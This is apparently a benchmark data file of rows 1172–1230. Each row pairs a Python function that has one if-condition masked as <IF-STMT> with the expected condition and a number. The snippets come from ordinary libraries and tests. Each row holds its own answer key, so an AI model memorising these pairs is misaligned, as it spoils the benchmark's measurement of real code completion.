1172,"def reader_matches(self, text):<tab>text = text[1:]<tab>matches = []<tab>for p in self.reader_path:<tab><tab>for k in p.keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if k.startswith(text):<tab><tab><tab><tab><tab>matches.append(""#{}"".format(k))<tab>return matches","if isinstance ( k , string_types ) :",88
1173,"def load_templates(templates: List[JobTemplateConfig]) -> None:<tab>handlers = {<tab><tab>TemplateSubmitHandler: build_template_func,<tab>}<tab>for handler in handlers:<tab><tab>for name in dir(handler):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>delattr(handler, name)<tab><tab>for template in templates:<tab><tab><tab>setattr(handler, template.name, handlers[handler](template))","if name . startswith ( ""_"" ) :",106
1174,"def scan_resource_conf(self, conf):<tab>if ""properties"" in conf:<tab><tab>if ""supportsHttpsTrafficOnly"" in conf[""properties""]:<tab><tab><tab>if str(conf[""properties""][""supportsHttpsTrafficOnly""]).lower() == ""true"":<tab><tab><tab><tab>return CheckResult.PASSED<tab><tab><tab>else:<tab><tab><tab><tab>return CheckResult.FAILED<tab># Use default if supportsHttpsTrafficOnly is not set<tab>if ""apiVersion"" in conf:<tab><tab># Default for apiVersion 2019 and newer is supportsHttpsTrafficOnly = True<tab><tab>year = int(conf[""apiVersion""][0:4])<tab><tab><IF-STMT><tab><tab><tab>return CheckResult.FAILED<tab><tab>else:<tab><tab><tab>return CheckResult.PASSED<tab>return CheckResult.FAILED",if year < 2019 :,192
1175,"def gather_failed_tests(output):<tab>if output.upper() == ""NONE"":<tab><tab>return []<tab>gatherer = GatherFailedTests()<tab>tests_or_tasks = ""tests or tasks""<tab>try:<tab><tab>suite = ExecutionResult(output, include_keywords=False).suite<tab><tab>suite.visit(gatherer)<tab><tab>tests_or_tasks = ""tests"" if not suite.rpa else ""tasks""<tab><tab><IF-STMT><tab><tab><tab>raise DataError(""All %s passed."" % tests_or_tasks)<tab>except:<tab><tab>raise DataError(<tab><tab><tab>""Collecting failed %s from '%s' failed: %s""<tab><tab><tab>% (tests_or_tasks, output, get_error_message())<tab><tab>)<tab>return gatherer.tests",if not gatherer . tests :,198
1176,"def ds_leak():<tab>print(""Testing vlens for dataset r/w"")<tab>print(""-----------------------------"")<tab>with h5py.File(FNAME, ""w"") as f:<tab><tab>ds = f.create_dataset(""dset"", (1000,), dtype=dt)<tab><tab>for idx in range(500):<tab><tab><tab># print idx<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print_memory()<tab><tab><tab>ds[...] = data<tab><tab><tab>ds[...]",if idx % 100 == 0 :,115
1177,"def extract_geth_traces(input, batch_size, output, max_workers):<tab>""""""Extracts geth traces from JSON lines file.""""""<tab>with smart_open(input, ""r"") as geth_traces_file:<tab><tab><IF-STMT><tab><tab><tab>traces_iterable = (json.loads(line) for line in geth_traces_file)<tab><tab>else:<tab><tab><tab>traces_iterable = (trace for trace in csv.DictReader(geth_traces_file))<tab><tab>job = ExtractGethTracesJob(<tab><tab><tab>traces_iterable=traces_iterable,<tab><tab><tab>batch_size=batch_size,<tab><tab><tab>max_workers=max_workers,<tab><tab><tab>item_exporter=traces_item_exporter(output),<tab><tab>)<tab><tab>job.run()","if input . endswith ( "".json"" ) :",193
1178,"def save_project_as():<tab>if PROJECT().last_save_path != None:<tab><tab>open_dir = os.path.dirname(PROJECT().last_save_path)<tab><tab># We don't  want to open hidden cache dir when saving file opened as autosave.<tab><tab><IF-STMT><tab><tab><tab>open_dir = expanduser(""~"")<tab>else:<tab><tab>open_dir = expanduser(""~"")<tab>dialogs.save_project_as_dialog(_save_as_dialog_callback, PROJECT().name, open_dir)",if open_dir . startswith ( userfolders . get_cache_dir ( ) ) == True :,139
1179,def _skip_to_next_iteration_group(self):<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>elif self._tgtkey is self._marker:<tab><tab><tab>break<tab><tab>else:<tab><tab><tab>if not self._tgtkey == self._currkey:<tab><tab><tab><tab>break<tab><tab>newvalue = next(self._iterator)<tab><tab>if self._keyfunc is None:<tab><tab><tab>newkey = newvalue<tab><tab>else:<tab><tab><tab>newkey = self._keyfunc(newvalue)<tab><tab>self._currkey = newkey<tab><tab>self._currvalue = newvalue,if self . _currkey is self . _marker :,153
1180,"def extractNames(self, names):<tab>offset = names[""offset""].value<tab>for header in names.array(""header""):<tab><tab>key = header[""nameID""].value<tab><tab>foffset = offset + header[""offset""].value<tab><tab>field = names.getFieldByAddress(foffset * 8)<tab><tab>if not field or not isString(field):<tab><tab><tab>continue<tab><tab>value = field.value<tab><tab>if key not in self.NAMEID_TO_ATTR:<tab><tab><tab>continue<tab><tab>key = self.NAMEID_TO_ATTR[key]<tab><tab><IF-STMT><tab><tab><tab># ""Version 1.2"" => ""1.2""<tab><tab><tab>value = value[8:]<tab><tab>setattr(self, key, value)","if key == ""version"" and value . startswith ( u""Version "" ) :",189
1181,"def visit_BoolOp(self, node):<tab>for i, value in enumerate(node.values):<tab><tab><IF-STMT><tab><tab><tab>self.visit(value)<tab><tab>else:<tab><tab><tab>self.visit(value)<tab><tab><tab>self.visit(node.op)",if i == len ( node . values ) - 1 :,75
1182,"def list_sparkline_type_id_values(<tab>date_range_sparkline, correlation_type, type_id, key_id):<tab>sparklines_value = []<tab>for date_day in date_range_sparkline:<tab><tab>nb_seen_this_day = r_serv_metadata.hget(<tab><tab><tab>""{}:{}:{}"".format(correlation_type, type_id, date_day), key_id<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>nb_seen_this_day = 0<tab><tab>sparklines_value.append(int(nb_seen_this_day))<tab>return sparklines_value",if nb_seen_this_day is None :,164
1183,"def find_nameless_urls(self, conf):<tab>nameless = []<tab>patterns = self.get_patterns(conf)<tab>for u in patterns:<tab><tab>if self.has_patterns(u):<tab><tab><tab>nameless.extend(self.find_nameless_urls(u))<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>nameless.append(u)<tab>return nameless",if u . name is None :,103
1184,"def find_zone_id(domain, client=None):<tab>paginator = client.get_paginator(""list_hosted_zones"")<tab>zones = []<tab>for page in paginator.paginate():<tab><tab>for zone in page[""HostedZones""]:<tab><tab><tab>if domain.endswith(zone[""Name""]) or (domain + ""."").endswith(zone[""Name""]):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>zones.append((zone[""Name""], zone[""Id""]))<tab>if not zones:<tab><tab>raise ValueError(""Unable to find a Route53 hosted zone for {}"".format(domain))<tab>return zones[0][1]","if not zone [ ""Config"" ] [ ""PrivateZone"" ] :",147
1185,"def _lookup_reference(self, reference):<tab>if not reference.startswith(""#/""):<tab><tab>return<tab>path = reference[2:].split(""/"")<tab>pointer = self.swagger<tab>for component in path:<tab><tab><IF-STMT><tab><tab><tab>raise IndexError(<tab><tab><tab><tab>""Can't find location by reference %r at part %r""<tab><tab><tab><tab>% (reference, component)<tab><tab><tab>)<tab><tab>pointer = pointer[component]<tab>self.log.debug(""Found by reference %r: %r"", reference, pointer)<tab>return pointer",if component not in pointer :,134
1186,"def read_line_from_file(ff):<tab># assuming that ff contains BV<tab>line = b""""<tab>while True:<tab><tab>vv = ff.read_data(1)[0]<tab><tab>if vv.symbolic:<tab><tab><tab>break<tab><tab>ct = bytes(chr(vv.args[0]), ""utf-8"")<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>line += ct<tab>return line","if ct == b""\n"" :",105
1187,"def gaussian(N=1000, draw=True, show=True, seed=42, color=None, marker=""sphere""):<tab>""""""Show N random gaussian distributed points using a scatter plot.""""""<tab>import ipyvolume as ipv<tab>rng = np.random.RandomState(seed)  # pylint: disable=no-member<tab>x, y, z = rng.normal(size=(3, N))<tab>if draw:<tab><tab>if color:<tab><tab><tab>mesh = ipv.scatter(x, y, z, marker=marker, color=color)<tab><tab>else:<tab><tab><tab>mesh = ipv.scatter(x, y, z, marker=marker)<tab><tab><IF-STMT><tab><tab><tab># ipv.squarelim()<tab><tab><tab>ipv.show()<tab><tab>return mesh<tab>else:<tab><tab>return x, y, z",if show :,191
1188,"def test_read_only_directory(self):<tab>with _inside_empty_temp_dir():<tab><tab>oldmode = mode = os.stat(tempfile.tempdir).st_mode<tab><tab>mode &= ~(stat.S_IWUSR | stat.S_IWGRP | stat.S_IWOTH)<tab><tab>os.chmod(tempfile.tempdir, mode)<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.skipTest(""can't set the directory read-only"")<tab><tab><tab>with self.assertRaises(PermissionError):<tab><tab><tab><tab>self.make_temp()<tab><tab><tab>self.assertEqual(os.listdir(tempfile.tempdir), [])<tab><tab>finally:<tab><tab><tab>os.chmod(tempfile.tempdir, oldmode)","if os . access ( tempfile . tempdir , os . W_OK ) :",185
1189,"def is_checked_sls_template(template):<tab>if template.__contains__(""provider""):<tab><tab># Case provider is a dictionary<tab><tab>if isinstance(template[""provider""], dict_node):<tab><tab><tab>if template[""provider""].get(""name"").lower() not in SUPPORTED_PROVIDERS:<tab><tab><tab><tab>return False<tab><tab># Case provider is direct provider name<tab><tab><IF-STMT><tab><tab><tab>if template[""provider""] not in SUPPORTED_PROVIDERS:<tab><tab><tab><tab>return False<tab><tab>return True<tab>return False","if isinstance ( template [ ""provider"" ] , str_node ) :",131
1190,"def detail(self, req):<tab>resp_backup = super(BackupsController, self).detail(req)<tab>context = req.environ[""cinder.context""]<tab>req_version = req.api_version_request<tab>if req_version.matches(mv.BACKUP_PROJECT):<tab><tab><IF-STMT><tab><tab><tab>for bak in resp_backup[""backups""]:<tab><tab><tab><tab>self._add_backup_project_attribute(req, bak)<tab>if req_version.matches(mv.BACKUP_PROJECT_USER_ID):<tab><tab>if context.authorize(policy.BACKUP_ATTRIBUTES_POLICY, fatal=False):<tab><tab><tab>for bak in resp_backup[""backups""]:<tab><tab><tab><tab>self._add_backup_user_attribute(req, bak)<tab>return resp_backup","if context . authorize ( policy . BACKUP_ATTRIBUTES_POLICY , fatal = False ) :",196
1191,"def genConditional(self):<tab>for i in range(3):<tab><tab>x = 0<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>x = 1<tab><tab>finally:<tab><tab><tab>for j in range(x, x + 2):<tab><tab><tab><tab>yield j",if i == 2 :,76
1192,def _cacheAffectedBones(self):<tab>self._affectedBones = []<tab>for f_idx in range(self.nFrames):<tab><tab>frameData = self.getAtFramePos(f_idx)<tab><tab>self._affectedBones.append([])<tab><tab>for b_idx in range(self.nBones):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._affectedBones[f_idx].append(b_idx),if not isRest ( frameData [ b_idx ] ) :,116
1193,"def load_metrics(self, filename, config_dict):<tab># we don't try to validate metrics keys<tab>if ""metrics"" in config_dict:<tab><tab>metrics = config_dict[""metrics""]<tab><tab><IF-STMT><tab><tab><tab>error(""c['metrics'] must be a dictionary"")<tab><tab>else:<tab><tab><tab>self.metrics = metrics","if not isinstance ( metrics , dict ) :",87
1194,"def _decode_list_response(response: Iterable[Any], decode: bool) -> Any:<tab>if decode is True:<tab><tab>new_response = []<tab><tab>for val in response:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>val = val.decode(""utf-8"")<tab><tab><tab>new_response.append(val)<tab><tab>return new_response<tab>return response","if isinstance ( val , bytes ) :",94
1195,"def _np_convert_in_place(d):<tab>""""""Convert any jax devicearray leaves to numpy arrays in place.""""""<tab>if isinstance(d, dict):<tab><tab>for k, v in d.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>d[k] = np.array(v)<tab><tab><tab>elif isinstance(v, dict):<tab><tab><tab><tab>_np_convert_in_place(v)<tab>elif isinstance(d, jax.xla.DeviceArray):<tab><tab>return np.array(d)<tab>return d","if isinstance ( v , jax . xla . DeviceArray ) :",141
1196,"def reader():<tab>with tarfile.open(filename, mode=""r"") as f:<tab><tab>names = (each_item.name for each_item in f if sub_name in each_item.name)<tab><tab>while True:<tab><tab><tab>for name in names:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>batch = pickle.load(f.extractfile(name))<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>batch = pickle.load(f.extractfile(name), encoding=""bytes"")<tab><tab><tab><tab>for item in read_batch(batch):<tab><tab><tab><tab><tab>yield item<tab><tab><tab>if not cycle:<tab><tab><tab><tab>break",if six . PY2 :,157
1197,"def _Determine_Do(self):<tab>self.applicable = 1<tab>method = ""moz-src""<tab>method_arg = None<tab>for opt, optarg in self.chosenOptions:<tab><tab>if opt == ""--moz-src"":<tab><tab><tab>method = ""moz-src""<tab><tab><IF-STMT><tab><tab><tab>method = ""moz-objdir""<tab><tab><tab>method_arg = optarg<tab>if method == ""moz-src"":<tab><tab>self.value = self._get_mozilla_objdir()<tab>elif method == ""moz-objdir"":<tab><tab>self.value = self._use_mozilla_objdir(method_arg)<tab>else:<tab><tab>raise black.configure.ConfigureError(""bogus method: %r"" % method)<tab>self.determined = 1","elif opt == ""--moz-objdir"" :",188
1198,"def close_all(map=None, ignore_all=False):<tab>if map is None:  # pragma: no cover<tab><tab>map = socket_map<tab>for x in list(map.values()):  # list() FBO py3<tab><tab>try:<tab><tab><tab>x.close()<tab><tab>except OSError as x:<tab><tab><tab>if x.args[0] == EBADF:<tab><tab><tab><tab>pass<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab>except _reraised_exceptions:<tab><tab><tab>raise<tab><tab>except:<tab><tab><tab>if not ignore_all:<tab><tab><tab><tab>raise<tab>map.clear()",elif not ignore_all :,157
1199,"def _attributes_to_xml(self, xml_element, prefix_root, debug_context=None):<tab>del debug_context  # Unused.<tab>for attribute_name, attribute in six.iteritems(self._attributes):<tab><tab>attribute_value = attribute.to_xml_string(prefix_root)<tab><tab><IF-STMT><tab><tab><tab>xml_element.set(attribute_name, self.full_identifier)<tab><tab>elif attribute_value is None:<tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>xml_element.set(attribute_name, attribute_value)",if attribute_name == self . _spec . identifier and attribute_value is None :,149
1200,"def parse(s):<tab>""""""Parse the output below to create a new StopWatch.""""""<tab>stopwatch = StopWatch()<tab>for line in s.splitlines():<tab><tab>if line.strip():<tab><tab><tab>parts = line.split(None)<tab><tab><tab>name = parts[0]<tab><tab><tab><IF-STMT>  # ie not the header line<tab><tab><tab><tab>rest = (float(v) for v in parts[2:])<tab><tab><tab><tab>stopwatch.times[parts[0]].merge(Stat.build(*rest))<tab>return stopwatch","if name != ""%"" :",128
1201,"def reverse_adjust_line_according_to_hunks(self, hunks, line):<tab>for hunk in reversed(hunks):<tab><tab>head_start = hunk.head_start<tab><tab>saved_start = hunk.saved_start<tab><tab>if hunk.saved_length == 0:<tab><tab><tab>saved_start += 1<tab><tab><IF-STMT><tab><tab><tab>saved_start -= 1<tab><tab>head_end = head_start + hunk.head_length<tab><tab>saved_end = saved_start + hunk.saved_length<tab><tab>if saved_end <= line:<tab><tab><tab>return head_end + line - saved_end<tab><tab>elif saved_start <= line:<tab><tab><tab>return head_start<tab># fails to find matching<tab>return line",elif hunk . head_length == 0 :,193
1202,"def add(self, *args):<tab>self._digest = None<tab>llt = Hasher.list_like_types<tab>for arg in args:<tab><tab>t = type(arg)<tab><tab><IF-STMT><tab><tab><tab>self._hasher.update(bytes(f""{llt[t]} {len(arg)}"", ""utf8""))<tab><tab><tab>self.add(*arg)<tab><tab>else:<tab><tab><tab>self._hasher.update(bytes(str(arg), ""utf8""))",if t in llt :,119
1203,"def filter(self, qs, value):<tab>if value:<tab><tab>if value.start is not None and value.stop is not None:<tab><tab><tab>value = (value.start, value.stop)<tab><tab><IF-STMT><tab><tab><tab>self.lookup_expr = ""startswith""<tab><tab><tab>value = value.start<tab><tab>elif value.stop is not None:<tab><tab><tab>self.lookup_expr = ""endswith""<tab><tab><tab>value = value.stop<tab>return super().filter(qs, value)",elif value . start is not None :,125
1204,"def _getResourceData(self, jid, dataname):<tab>""""""Return specific jid's resource representation in internal format. Used internally.""""""<tab>if jid.find(""/"") + 1:<tab><tab>jid, resource = jid.split(""/"", 1)<tab><tab>if self._data[jid][""resources""].has_key(resource):<tab><tab><tab>return self._data[jid][""resources""][resource][dataname]<tab>elif self._data[jid][""resources""].keys():<tab><tab>lastpri = -129<tab><tab>for r in self._data[jid][""resources""].keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>resource, lastpri = r, int(self._data[jid][""resources""][r][""priority""])<tab><tab>return self._data[jid][""resources""][resource][dataname]","if int ( self . _data [ jid ] [ ""resources"" ] [ r ] [ ""priority"" ] ) > lastpri :",194
1205,"def OnGetText(self, node_id):<tab>try:<tab><tab>ea, rows = self[node_id]<tab><tab><IF-STMT><tab><tab><tab>colour = self.colours[ea]<tab><tab>else:<tab><tab><tab>colour = 0xFFFFFF<tab><tab>ret = []<tab><tab>for row in rows:<tab><tab><tab>ret.append(row[2])<tab><tab>label = ""\n"".join(ret)<tab><tab>return (label, colour)<tab>except:<tab><tab>print(""GraphViewer.OnGetText:"", sys.exc_info()[1])<tab><tab>return (""ERROR"", 0x000000)",if ea in self . colours :,150
1206,"def _apply_scales(array, scales, dtype):<tab>""""""Apply scales to the array.""""""<tab>new_array = np.empty(array.shape, dtype)<tab>for i in array.dtype.names:<tab><tab>try:<tab><tab><tab>new_array[i] = array[i] * scales[i]<tab><tab>except TypeError:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>new_array[i] = array[i]<tab><tab><tab>else:<tab><tab><tab><tab>raise<tab>return new_array",if np . all ( scales [ i ] == 1 ) :,130
1207,"def run(self):<tab>self.running = True<tab>while self.running:<tab><tab>errCode, bytes, key, overlapped = GetQueuedCompletionStatus(<tab><tab><tab>self.io_req_port, INFINITE<tab><tab>)<tab><tab>if key == ISAPI_SHUTDOWN and overlapped is None:<tab><tab><tab>break<tab><tab># Let the parent extension handle the command.<tab><tab>dispatcher = self.extension.dispatch_map.get(key)<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(""Bad request '%s'"" % (key,))<tab><tab>dispatcher(errCode, bytes, key, overlapped)",if dispatcher is None :,144
1208,"def on_task_filter(self, task, config):<tab>if task.options.learn:<tab><tab>log.info(""Plugin limit_new is disabled with --learn"")<tab><tab>return<tab>amount = config<tab>for index, entry in enumerate(task.accepted):<tab><tab><IF-STMT><tab><tab><tab>log.verbose(""Allowed %s (%s)"" % (entry[""title""], entry[""url""]))<tab><tab>else:<tab><tab><tab>entry.reject(""limit exceeded"")<tab><tab><tab># Also save this in backlog so that it can be accepted next time.<tab><tab><tab>plugin.get(""backlog"", self).add_backlog(task, entry)<tab>log.debug(<tab><tab>""Rejected: %s Allowed: %s""<tab><tab>% (len(task.accepted[amount:]), len(task.accepted[:amount]))<tab>)",if index < amount :,196
1209,"def initialize_pairs(self):<tab># White on Black is fixed as color_pair 0<tab>self._defined_pairs[""WHITE_BLACK""] = (0, curses.COLOR_WHITE, curses.COLOR_BLACK)<tab>for cp in self.__class__._colors_to_define:<tab><tab><IF-STMT><tab><tab><tab># silently protect the user from breaking things.<tab><tab><tab>continue<tab><tab>self.initalize_pair(cp[0], cp[1], cp[2])","if cp [ 0 ] == ""WHITE_BLACK"" :",118
1210,"def get_story_task_body(payload: Dict[str, Any], action: str) -> str:<tab>primary_action = get_action_with_primary_id(payload)<tab>kwargs = {<tab><tab>""task_description"": primary_action[""description""],<tab><tab>""action"": action,<tab>}<tab>for a in payload[""actions""]:<tab><tab><IF-STMT><tab><tab><tab>kwargs[""name_template""] = STORY_NAME_TEMPLATE.format(<tab><tab><tab><tab>name=a[""name""],<tab><tab><tab><tab>app_url=a[""app_url""],<tab><tab><tab>)<tab>return STORY_TASK_TEMPLATE.format(**kwargs)","if a [ ""entity_type"" ] == ""story"" :",163
1211,"def _key_remap(key, keys, item):<tab>elements_list = []<tab>for r_item in item.get(key, []):<tab><tab>element = {}<tab><tab>for r_outkey, r_inkey in six.iteritems(keys):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>element[r_outkey] = r_item.get(r_inkey)<tab><tab>elements_list.append(element)<tab>return elements_list",if r_inkey in r_item :,115
1212,"def fix_identities(self, uniq=None):<tab>""""""Make pattern-tree tips point to same object if they are equal.""""""<tab>if not hasattr(self, ""children""):<tab><tab>return self<tab>uniq = list(set(self.flat())) if uniq is None else uniq<tab>for i, c in enumerate(self.children):<tab><tab><IF-STMT><tab><tab><tab>assert c in uniq<tab><tab><tab>self.children[i] = uniq[uniq.index(c)]<tab><tab>else:<tab><tab><tab>c.fix_identities(uniq)","if not hasattr ( c , ""children"" ) :",138
1213,"def _apply_main_args(main_args, exec_args):<tab>i = 0<tab>while i < len(exec_args):<tab><tab><IF-STMT><tab><tab><tab>exec_args[i : i + 1] = main_args<tab><tab><tab>i += len(main_args)<tab><tab>i += 1","if exec_args [ i ] == ""${main_args}"" :",87
1214,"def _clean_text(self, text):<tab>""""""Performs invalid character removal and whitespace cleanup on text.""""""<tab>output = []<tab>char_idx = []<tab>for i, char in enumerate(text):<tab><tab>cp = ord(char)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if _is_whitespace(char):<tab><tab><tab>output.append("" "")<tab><tab><tab>char_idx.append(i)<tab><tab>else:<tab><tab><tab>output.append(char)<tab><tab><tab>char_idx.append(i)<tab>return """".join(output), char_idx",if cp == 0 or cp == 0xFFFD or _is_control ( char ) :,151
1215,"def upgrade_state_dict_named(self, state_dict, name):<tab>prefix = name + ""."" if name != """" else """"<tab>for k, v in state_dict.items():<tab><tab>if k.endswith(prefix + ""weight""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>state_dict[k] = v.squeeze(1)",if v . dim ( ) == 3 and v . size ( 1 ) == 1 :,96
1216,"def fetch_with_retry(self):<tab>for i in range(self.max_retries):<tab><tab>try:<tab><tab><tab>self.is_truncated, self.next_marker = self._fetch()<tab><tab>except ServerError as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab><tab>if i == self.max_retries - 1:<tab><tab><tab><tab>raise<tab><tab>else:<tab><tab><tab>return",if e . status // 100 != 5 :,107
1217,"def hg_hook(ui, repo, node=None, **kwargs):<tab>""""""Run pylama after mercurial commit.""""""<tab>seen = set()<tab>paths = []<tab>if len(repo):<tab><tab>for rev in range(repo[node], len(repo)):<tab><tab><tab>for file_ in repo[rev].files():<tab><tab><tab><tab>file_ = op.join(repo.root, file_)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>seen.add(file_)<tab><tab><tab><tab>paths.append(file_)<tab>options = parse_options()<tab>setup_logger(options)<tab>if paths:<tab><tab>process_paths(options, candidates=paths)",if file_ in seen or not op . exists ( file_ ) :,177
1218,"def test_playlist_items(self):<tab>playlists = self.spotify.user_playlists(self.username, limit=5)<tab>self.assertTrue(""items"" in playlists)<tab>for playlist in playlists[""items""]:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>pid = playlist[""id""]<tab><tab>results = self.spotify.playlist_items(pid)<tab><tab>self.assertEqual(len(results[""items""]), 0)","if playlist [ ""uri"" ] != self . new_playlist_uri :",111
1219,"def update_execute_option_setting(<tab>css_selector_of_option_status, css_selector_of_option):<tab>retry = 3<tab>check_status = self.driver.find_element_by_css_selector(<tab><tab>css_selector_of_option_status<tab>)<tab>if ""visibility-hidden"" not in check_status.get_attribute(""class""):<tab><tab>while retry > 0:<tab><tab><tab>self.find_by_css_selector(css_selector_of_option).click()<tab><tab><tab>time.sleep(0.2)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>else:<tab><tab><tab><tab>retry -= 1","if ""visibility-hidden"" in check_status . get_attribute ( ""class"" ) :",175
1220,"def _validate_config(self):<tab># convert comma separated strings to lists (ConfigParser)<tab>for item in [""to"", ""cc"", ""bcc""]:<tab><tab>if item in self.app.config.keys(self._meta.config_section):<tab><tab><tab>value = self.app.config.get(self._meta.config_section, item)<tab><tab><tab># convert a comma-separated string to a list<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value_list = value.split("","")<tab><tab><tab><tab># clean up extra space if they had it inbetween commas<tab><tab><tab><tab>value_list = [x.strip() for x in value_list]<tab><tab><tab><tab># set the new extensions value in the config<tab><tab><tab><tab>self.app.config.set(self._meta.config_section, item, value_list)",if type ( value ) is str :,199
1221,"def cell_func(combo, render, model, iter_, *args):<tab>value = model.get_value(iter_)<tab>if value is None:<tab><tab>text = escape(_(""System Default""))<tab>else:<tab><tab><IF-STMT><tab><tab><tab>value = u""en""<tab><tab>text = ""%s <span weight='light'>(%s)</span>"" % (<tab><tab><tab>escape(value),<tab><tab><tab>escape(iso639.translate(value.split(""_"", 1)[0])),<tab><tab>)<tab>render.set_property(""markup"", text)","if value == u""C"" :",133
1222,"def _get_all_tasks():<tab>proc = Popen([""yarn"", ""--help""], stdout=PIPE)<tab>should_yield = False<tab>for line in proc.stdout.readlines():<tab><tab>line = line.decode().strip()<tab><tab>if ""Commands:"" in line:<tab><tab><tab>should_yield = True<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>yield line.split("" "")[-1]","if should_yield and ""- "" in line :",103
1223,"def _staged_model_references(self, load_relationships=False):<tab>for name, field in self._fields.items():<tab><tab>if isinstance(field, BaseRelationship):<tab><tab><tab>try:<tab><tab><tab><tab>if load_relationships:<tab><tab><tab><tab><tab>value = getattr(self, name)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>value = self.data_store.get(name, (""staged"", ""committed""))<tab><tab><tab>except (AttributeError, KeyError, PathResolutionError):<tab><tab><tab><tab>continue<tab><tab><tab>if value is None:<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = [value]<tab><tab><tab>for related in value:<tab><tab><tab><tab>related_name = field.related_name<tab><tab><tab><tab>yield related, related_name","if not isinstance ( value , ModelCollection ) :",198
1224,"def get_all_fix_names(fixer_pkg, remove_prefix=True):<tab>""""""Return a sorted list of all available fix names in the given package.""""""<tab>pkg = __import__(fixer_pkg, [], [], [""*""])<tab>fixer_dir = os.path.dirname(pkg.__file__)<tab>fix_names = []<tab>for name in sorted(os.listdir(fixer_dir)):<tab><tab>if name.startswith(""fix_"") and name.endswith("".py""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>name = name[4:]<tab><tab><tab>fix_names.append(name[:-3])<tab>return fix_names",if remove_prefix :,147
1225,"def extract_info_to_dest(self, info, dest):<tab>""""""Extracts the given info to a directory and checks the file size.""""""<tab>self.zip_file.extract(info, dest)<tab>dest = os.path.join(dest, info.filename)<tab>if not os.path.isdir(dest):<tab><tab># Directories consistently report their size incorrectly.<tab><tab>size = os.stat(dest)[stat.ST_SIZE]<tab><tab><IF-STMT><tab><tab><tab>log.error(<tab><tab><tab><tab>""Extraction error, uncompressed size: %s, %s not %s""<tab><tab><tab><tab>% (self.source, size, info.file_size)<tab><tab><tab>)<tab><tab><tab>raise forms.ValidationError(gettext(""Invalid archive.""))",if size != info . file_size :,182
1226,"def _close_brackets(self, fragment):<tab># If there any unclosed brackets in the text we try to close them<tab># and we return part with closing brackets if they are ""closable""<tab>stack = []<tab>for char in fragment:<tab><tab><IF-STMT><tab><tab><tab>stack.append(char)<tab><tab>elif char in self._PARENS.values():<tab><tab><tab>if stack and self._PARENS[stack[-1]] == char:<tab><tab><tab><tab>stack.pop()<tab><tab><tab>else:<tab><tab><tab><tab>return """"<tab>return """".join(self._PARENS[paren] for paren in reversed(stack))",if char in self . _PARENS . keys ( ) :,150
1227,"def __call__(self, input_tensors, shape):<tab>if self.order in ""KA"":<tab><tab>if any(t.order == TensorOrder.C_ORDER for t in input_tensors):<tab><tab><tab>order = TensorOrder.C_ORDER<tab><tab>else:<tab><tab><tab>order = TensorOrder.F_ORDER<tab>else:<tab><tab><IF-STMT><tab><tab><tab>order = TensorOrder.C_ORDER<tab><tab>else:<tab><tab><tab>order = TensorOrder.F_ORDER<tab>return self.new_tensor(input_tensors, shape=shape, dtype=self.dtype, order=order)","if self . order == ""C"" :",141
1228,"def __iter__(self):<tab>iteration = self.start_iter<tab>while iteration <= self.num_iterations:<tab><tab># if the underlying sampler has a set_epoch method, like<tab><tab># DistributedSampler, used for making each process see<tab><tab># a different split of the dataset, then set it<tab><tab><IF-STMT><tab><tab><tab>self.batch_sampler.sampler.set_epoch(iteration)<tab><tab>for batch in self.batch_sampler:<tab><tab><tab>iteration += 1<tab><tab><tab>if iteration > self.num_iterations:<tab><tab><tab><tab>break<tab><tab><tab>yield batch","if hasattr ( self . batch_sampler . sampler , ""set_epoch"" ) :",151
1229,def all_pairs_shortest_path(adjacency_matrix):<tab>new_array = copy.deepcopy(adjacency_matrix)<tab>for k in range(len(new_array)):<tab><tab>for i in range(len(new_array)):<tab><tab><tab>for j in range(len(new_array)):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>new_array[i][j] = new_array[i][k] + new_array[k][j]<tab>return new_array,if new_array [ i ] [ j ] > new_array [ i ] [ k ] + new_array [ k ] [ j ] :,142
1230,"def cancel_pp(self, nzo_id):<tab>""""""Change the status, so that the PP is canceled""""""<tab>for nzo in self.history_queue:<tab><tab>if nzo.nzo_id == nzo_id:<tab><tab><tab>nzo.abort_direct_unpacker()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>nzo.pp_active = False<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab># Try to kill any external running process<tab><tab><tab><tab><tab>self.external_process.kill()<tab><tab><tab><tab><tab>logging.info(<tab><tab><tab><tab><tab><tab>""Killed external process %s"", self.external_process.args[0]<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>except:<tab><tab><tab><tab><tab>pass<tab><tab><tab>return True<tab>return None",if nzo . pp_active :,196
